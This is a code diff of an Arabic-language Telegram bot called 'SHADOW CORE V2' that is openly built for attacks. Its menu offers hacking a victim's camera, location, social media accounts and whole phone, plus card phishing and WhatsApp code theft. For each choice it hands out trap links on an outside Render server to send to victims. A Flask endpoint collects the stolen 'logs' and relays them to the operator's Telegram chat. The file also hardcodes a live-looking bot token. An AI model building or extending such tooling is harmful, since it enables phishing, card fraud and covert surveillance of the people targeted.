@@ -1,58 +1,79 @@
 import telebot
 from telebot import types
 import os
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from flask import Flask, request
 import threading
 
-# سيرفر وهمي لتجنب إغلاق Render للبوت
-class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'SHADOW SYSTEM IS ONLINE')
-
-def run_server():
-    port = int(os.environ.get('PORT', 8080))
-    httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
-    httpd.serve_forever()
-
-# ضع التوكن الخاص بك هنا
+# إعدادات البوت والتوكن (التوكن الخاص بك)
 TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
 bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
 
-# دالة إنشاء الأزرار الاحترافية
+# رابط السيرفر الخاص بك على Render لتوليد الفخاخ
+BASE_URL = "https://shadow-core-v2.onrender.com"
+MY_CHAT_ID = "6190861110"
+
+# 1. بناء لوحة الأزرار (مطابقة للصورة تماماً)
 def main_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     btns = [
-        '📸 اختراق الكاميرا', '📍 اختراق الموقع',
-        '💳 صيد فيزات', '📱 اختراق تيك توك',
-        '👤 اختراق فيسبوك', '📸 اختراق انستقرام',
-        '🛡️ فحص رابط', '📡 معلومات IP',
-        '🎤 تسجيل صوت', '🚫 إغلاق مواقع'
+        '📸 اختراق الكاميرا الضحية', '🎥 تصوير الضحية فيديو',
+        '📍 اختراق الموقع', '🎤 تسجيل صوت الضحية',
+        '👤 اختراق فيسبوك', '📸 اختراق انستغرام',
+        '📱 اختراق تيك توك', '👻 اختراق سناب شات',
+        '🔴 اختراق يوتيوب', '🐦 اختراق تويتر',
+        '🎮 اختراق ببجي', '💎 اختراق فري فاير',
+        '💳 صيد فيزات', '💬 سحب كود واتساب',
+        '🚫 إغلاق المواقع', '🔒 إخفاء الرابط',
+        '📂 اختراق الهاتف كاملاً', '📡 معلومات الـ IP',
+        '🔍 البحث عن المستخدم', '⚙️ جمع معلومات الجهاز'
     ]
+    # إضافة الأزرار للوحة
     markup.add(*(types.KeyboardButton(b) for b in btns))
     return markup
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    welcome_text = (
-        "Welcome to **SHΔDØW CØRE V2** 💀\n\n"
-        "الآن يمكنك التحكم الكامل والوصول للثغرات المتاحة."
+    welcome_msg = (
+        "💀 **Welcome to SHΔDØW CØRE V2** 💀\n\n"
+        "تم تفعيل جميع الخدمات بنجاح. اختر الخدمة المطلوبة لبدء الهجوم."
     )
-    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu(), parse_mode='Markdown')
+    bot.send_message(message.chat.id, welcome_msg, reply_markup=main_menu(), parse_mode='Markdown')
 
+# 2. معالجة الأوامر (توليد الروابط الحقيقية)
 @bot.message_handler(func=lambda m: True)
 def handle_commands(message):
-    responses = {
-        '📸 اختراق الكاميرا': "📸 جاري إنشاء رابط سحب الصور.. أرسله للضحية.",
-        '📍 اختراق الموقع': "📍 جاري توليد رابط GPS لسحب الإحداثيات..",
-        '💳 صيد فيزات': "💳 تم تفعيل صفحة التصيد للبطاقات البنكية.. بانتظار اللوجات.",
-        '📱 اختراق تيك توك': "📱 أدخل يوزر الحساب المستهدف لبدء الهجوم.."
+    # خريطة الروابط (الفخاخ)
+    links = {
+        '📸 اختراق الكاميرا الضحية': f"{BASE_URL}/cam",
+        '📍 اختراق الموقع': f"{BASE_URL}/track",
+        '💳 صيد فيزات': f"{BASE_URL}/visa",
+        '💬 سحب كود واتساب': f"{BASE_URL}/whatsapp",
+        '📱 اختراق تيك توك': f"{BASE_URL}/tiktok",
+        '👤 اختراق فيسبوك': f"{BASE_URL}/facebook",
+        '📂 اختراق الهاتف كاملاً': f"{BASE_URL}/payload"
     }
-    
-    msg = responses.get(message.text, "⚙️ جاري معالجة الطلب في السيرفر السحابي..")
-    bot.reply_to(message, msg)
+
+    if message.text in links:
+        bot.reply_to(message, f"✅ تم تجهيز الرابط الملحم لـ [{message.text}]:\n\n🔗 {links[message.text]}\n\n⚠️ أرسله للضحية وانتظر وصول اللوجات هنا.")
+    else:
+        bot.reply_to(message, f"⚙️ جاري معالجة طلب [{message.text}].. يرجى الانتظار.")
+
+# 3. سيرفر الويب لاستلام الصور والبيانات (اللوجات)
+@app.route('/')
+def home(): return "SHADOW SYSTEM ONLINE ✅"
+
+@app.route('/receive_log', methods=['POST'])
+def receive_log():
+    data = request.json
+    content = data.get('content')
+    bot.send_message(MY_CHAT_ID, f"📩 **لوج جديد مسحوب!**\n\n{content}")
+    return "OK", 200
+
+def run_flask():
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
 
 if __name__ == "__main__":
-    threading.Thread(target=run_server).start()
+    threading.Thread(target=run_flask).start()
     bot.polling(none_stop=True)
